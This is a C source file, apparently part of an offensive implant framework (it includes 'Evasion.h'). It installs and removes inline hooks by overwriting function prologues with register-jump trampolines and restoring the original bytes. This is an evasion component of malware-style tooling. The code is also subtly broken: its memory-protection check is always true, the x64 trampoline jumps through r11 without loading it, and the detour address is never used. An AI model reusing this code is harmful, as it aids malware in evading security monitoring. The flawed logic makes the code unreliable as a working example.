#include <Common.h>
#include <Evasion.h>

FUNC BOOL InstallHookingPatch(
    PHOOK_PATCH HookPatch
) {
#ifdef _M_X64
    BYTE Trampoline[TRAMPOLINE_SIZE] = { 
        0x41, 0xFF, 0xE3
    };
#endif

#ifdef _M_X86
    BYTE Trampoline[TRAMPOLINE_SIZE] = { 
        0xFF, 0xE0
    };
#endif
    UINT32 OldPr = 0;
    MEMORY_BASIC_INFORMATION Mbi = { 0 };
    UINT64 Patch = HookPatch->AddressHook;

    MmCopy( HookPatch->OriginalBytes, HookPatch->AddressHook, sizeof( HookPatch->OriginalBytes ) );
    
    bkMemQuery( NULL, HookPatch->AddressHook, &Mbi );
    if ( 
         Mbi.Protect != PAGE_READWRITE         || 
         Mbi.Protect != PAGE_EXECUTE_READWRITE || 
         Mbi.Protect != PAGE_WRITECOPY         ||
         Mbi.Protect != PAGE_EXECUTE_WRITECOPY
    ) {
        bkMemProtect( NULL, HookPatch->AddressHook, sizeof( Trampoline ), PAGE_READWRITE, &HookPatch->OldProtection );
    }

    MmCopy( HookPatch->AddressHook, Trampoline, sizeof( Trampoline ) );

    bkMemProtect( NULL, HookPatch->AddressHook, sizeof( Trampoline ), HookPatch->OldProtection, &OldPr );

    return TRUE;
}

FUNC BOOL RmHookingPatch(
    PHOOK_PATCH HookPatch
) {
    UINT32 OldPr = 0;
    UINT32 OldProtection = 0;
    MEMORY_BASIC_INFORMATION Mbi = { 0 };

    bkMemQuery( NULL, HookPatch->AddressHook, &Mbi );
    if ( 
         Mbi.Protect != PAGE_READWRITE         || 
         Mbi.Protect != PAGE_EXECUTE_READWRITE || 
         Mbi.Protect != PAGE_WRITECOPY         ||
         Mbi.Protect != PAGE_EXECUTE_WRITECOPY
    ) {
        bkMemProtect( NULL, HookPatch->AddressHook, sizeof( HookPatch->OriginalBytes ), PAGE_READWRITE, &HookPatch->OldProtection );
    }

    MmCopy( HookPatch->AddressHook, HookPatch->OriginalBytes, sizeof( HookPatch->OriginalBytes ) );

    bkMemProtect( NULL, HookPatch->AddressHook, sizeof( HookPatch->OriginalBytes ), HookPatch->OldProtection, &OldPr );

    HookPatch->AddressHook   = NULL;
    HookPatch->OldProtection = 0;
    HookPatch->AddressDetour = NULL;

    return TRUE;
}
